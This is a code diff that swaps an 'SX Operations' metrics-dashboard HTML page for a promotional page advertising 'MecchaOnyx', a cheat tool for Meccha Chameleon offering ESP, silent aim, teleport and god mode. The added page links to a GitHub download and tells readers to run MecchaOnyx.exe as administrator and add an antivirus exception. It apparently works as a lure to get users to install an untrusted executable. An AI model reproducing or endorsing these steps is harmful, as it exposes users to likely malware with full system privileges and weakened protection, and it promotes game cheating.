@@ -1,87 +1,72 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Public SX Operations product metrics dashboard." />
-    <title>Product Day — SX Operations</title>
-    <link rel="stylesheet" href="styles.css" />
-  </head>
-  <body>
-    <main class="page-shell">
-      <section id="login-screen" class="login-screen" aria-labelledby="login-title">
-        <p class="eyebrow">Product Day</p>
-        <h1 id="login-title">SX Operations metrics</h1>
-        <p class="intro">Enter your dashboard password to view the latest protected snapshot.</p>
-        <form id="login-form" class="login-form">
-          <label for="password">Password</label>
-          <input id="password" name="password" type="password" autocomplete="current-password" required />
-          <button type="submit">Open dashboard</button>
-          <p id="login-error" class="form-message" role="alert"></p>
-        </form>
-      </section>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="MecchaOnyx software for Meccha Chameleon. Access advanced visual overlays, movement tools, and survival features for your game.">
+    <title>MecchaOnyx - Gain the Advantage in Meccha Chameleon</title>
+</head>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f4f7f6;">
 
-      <div id="app-content" hidden>
-      <header class="topbar">
-        <h1>SX Operations</h1>
-        <div class="topbar__controls">
-          <span id="snapshot-date" class="meta-pill">Loading snapshot…</span>
-          <div class="dashboard-actions">
-            <button id="update-button" type="button">Update</button>
-            <button id="sign-out-button" class="button-secondary" type="button">Sign out</button>
-          </div>
-        </div>
-        <span id="refresh-state" class="visually-hidden">Protected snapshot</span>
-        <section id="refresh-progress" class="refresh-progress" aria-live="polite" hidden>
-          <div class="refresh-progress__topline">
-            <strong id="refresh-progress-title">Preparing update</strong>
-            <span id="refresh-progress-percent">0%</span>
-          </div>
-          <div class="refresh-progress__track" role="progressbar" aria-label="Dashboard update progress" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
-            <span id="refresh-progress-bar"></span>
-          </div>
-          <p id="refresh-progress-detail"></p>
-        </section>
-      </header>
+    <h1 style="color: #2c3e50; font-size: 2.5em; text-align: center;">👁️ MecchaOnyx - Gain the Advantage in Meccha Chameleon</h1>
 
-      <section id="key-health" class="key-health" aria-labelledby="key-health-title">
-        <div class="key-health__header">
-          <h2 id="key-health-title">Key product health</h2>
-        </div>
-        <div id="key-health-grid" class="key-health__grid"></div>
-      </section>
-      <section id="attention-summary" class="attention-summary" aria-live="polite"></section>
-      <div id="dashboard" class="dashboard" aria-live="polite"></div>
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/nemesi7834/MecchaOnyx" style="background-color: #34495e; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 1.2em; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download MecchaOnyx</a>
+    </div>
 
-      <footer id="engagement-footer" class="engagement-footer">
-        <section class="notice" aria-label="Data availability note">
-          <span aria-hidden="true">ℹ</span>
-          <p>Some July engagement metrics are marked <strong>Waiting for data transfer</strong>. Their latest confirmed historical values remain visible.</p>
-        </section>
-      </footer>
-      </div>
-    </main>
+    <p>MecchaOnyx allows players to decode game data within Meccha Chameleon. The software provides tools to reveal hidden positions, improve movement, and enhance survival. You use these functions to change your game experience.</p>
 
-    <template id="metric-card-template">
-      <article class="metric-card">
-        <div class="metric-card__header">
-          <h3></h3>
-          <div class="metric-card__badges">
-            <span class="attention-badge" hidden></span>
-            <span class="trend-badge"></span>
-          </div>
-        </div>
-        <p class="metric-value"></p>
-        <p class="metric-period"></p>
-        <div class="sparkline" aria-hidden="true"></div>
-        <details class="history">
-          <summary>View history</summary>
-          <ul></ul>
-        </details>
-      </article>
-    </template>
+    <h2 style="color: #2c3e50;">🛠️ Features</h2>
+    <p>This software integrates several tools to assist your gameplay:</p>
+    <ul>
+        <li><strong>ESP (Extra Sensory Perception):</strong> See player positions and game objects through walls and obstacles.</li>
+        <li><strong>Silent Aim:</strong> Improve your accuracy without visible crosshair adjustments.</li>
+        <li><strong>Flight Mode:</strong> Move vertically and navigate maps with freedom.</li>
+        <li><strong>Teleport:</strong> Travel to specific coordinate points instantly.</li>
+        <li><strong>God Mode:</strong> Increase your survivability against incoming damage.</li>
+        <li><strong>Unlimited Paint:</strong> Maintain your paint reserves for auto-painting functions.</li>
+    </ul>
 
-    <script src="config.js"></script>
-    <script type="module" src="app.js"></script>
-  </body>
+    <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+    <p>Before you run this software, ensure your system meets these standards:</p>
+    <ul>
+        <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit).</li>
+        <li><strong>Memory:</strong> 8 GB RAM or higher.</li>
+        <li><strong>Graphics:</strong> Dedicated GPU with current driver support.</li>
+        <li><strong>Permissions:</strong> Administrator access to modify game memory processes.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">📥 Installation Guide</h2>
+    <p>Follow these steps to set up the software on your computer.</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/nemesi7834/MecchaOnyx" style="color: #2980b9;">official distribution page</a> to download the latest version.</li>
+        <li>Locate the <strong>MecchaOnyx.exe</strong> file in your downloads folder.</li>
+        <li>Right-click the file and select "Run as administrator." This step ensures the software has sufficient access to interact with the game engine.</li>
+        <li>Accept the prompt from Windows if it appears to allow the application to make changes to your device.</li>
+        <li>Wait for the interface to load. You will see a control panel once the program detects your active game session.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">⚙️ Usage Instructions</h2>
+    <p>Once you open the software, follow this workflow to use the tools:</p>
+    <ol>
+        <li>Launch Meccha Chameleon first.</li>
+        <li>Return to the desktop and open MecchaOnyx.</li>
+        <li>Use the checkboxes on the interface to enable specific features like ESP or Flight.</li>
+        <li>Return to your game. The software applies the selected changes in real-time.</li>
+        <li>If you need to close the tools, return to the MecchaOnyx window and click the exit button.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">❓ Troubleshooting</h2>
+    <p>If you encounter issues, verify the following points:</p>
+    <ul>
+        <li><strong>Game crashes:</strong> Ensure your game is running in "Windowed" or "Borderless Windowed" mode.</li>
+        <li><strong>Overlay missing:</strong> Check if your antivirus software blocked the process. You may need to add an exception for the folder.</li>
+        <li><strong>Tools not working:</strong> Verify that you are running the game from an official source and that your game version matches the software release version.</li>
+    </ul>
+
+    <div style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 0.9em; color: #7f8c8d;">
+        <p>Keywords: mecca-chameleon, mecca-chameleon-aimbot, mecca-chameleon-auto-paint, mecca-chameleon-autopaint, mecca-chameleon-camouflage, mecca-chameleon-cheat, mecca-chameleon-cheats, mecca-chameleon-esp, mecca-chameleon-hack, mecca-chameleon-mod</p>
+    </div>
+
+</body>
 </html>
